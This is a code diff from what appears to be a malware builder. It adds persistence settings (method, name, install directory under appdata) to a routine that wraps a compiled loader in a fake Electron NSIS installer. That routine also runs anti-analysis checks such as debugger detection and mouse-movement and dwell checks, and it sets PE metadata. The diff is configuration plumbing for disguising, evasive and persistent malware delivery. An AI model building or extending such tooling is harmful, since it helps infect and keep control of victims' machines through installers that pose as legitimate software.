@@ -217,6 +217,13 @@ _DEFAULT_GUARDRAILS = {
     "debugMode": False,
 }
 
+_DEFAULT_PERSISTENCE = {
+    "enabled": False,
+    "method": "none",
+    "name": "",
+    "installDir": "appdata",
+}
+
 
 def _render_config(
     project_dir: pathlib.Path,
@@ -228,10 +235,17 @@ def _render_config(
     entry_name: str,
     dll_entry: str,
     guardrails: Optional[dict] = None,
+    persistence: Optional[dict] = None,
 ) -> None:
     gr = dict(_DEFAULT_GUARDRAILS)
     if guardrails:
         gr.update(guardrails)
+
+    ps = dict(_DEFAULT_PERSISTENCE)
+    if persistence:
+        ps.update(persistence)
+    if not ps["name"]:
+        ps["name"] = product
 
     env = Environment(loader=FileSystemLoader(str(TEMPLATES_DIR)))
     tmpl = env.get_template("electron_config.js.j2")
@@ -260,6 +274,10 @@ def _render_config(
         GR_MAX_IDLE_SECONDS=gr["maxIdleSeconds"],
         GR_PRE_SPAWN_DELAY_MS=gr["preSpawnDelayMs"],
         GR_DEBUG_MODE=gr["debugMode"],
+        PERSIST_ENABLED=ps["enabled"],
+        PERSIST_METHOD=ps["method"],
+        PERSIST_NAME=ps["name"],
+        PERSIST_INSTALL_DIR=ps["installDir"],
     )
     (project_dir / "src" / "config.js").write_text(rendered, encoding="utf-8")
 
@@ -403,6 +421,7 @@ def build_electron_installer(
     copyright_str: str = "",
     custom_icon_bytes: Optional[bytes] = None,
     guardrails: Optional[dict] = None,
+    persistence: Optional[dict] = None,
 ) -> pathlib.Path:
     """
     Wrap the compiled loader in the Electron fake-installer NSIS.
@@ -423,6 +442,8 @@ def build_electron_installer(
         BuildParameters (enabled, dwellMs, requireMouseMovement,
         checkDebugger, hostnameWhitelist, ...). When omitted or
         ``enabled=False``, no guardrails run at install time.
+    :param persistence: Optional dict of persistence settings. Keys:
+        enabled (bool), method (str), name (str), installDir (str).
     :return: Path to the produced NSIS installer placed in payload/.
     """
     payload_dir = build_path / "payload"
@@ -445,6 +466,7 @@ def build_electron_installer(
         entry_name=entry_name,
         dll_entry=dll_entry,
         guardrails=guardrails,
+        persistence=persistence,
     )
     _apply_pe_metadata(
         project_dir,
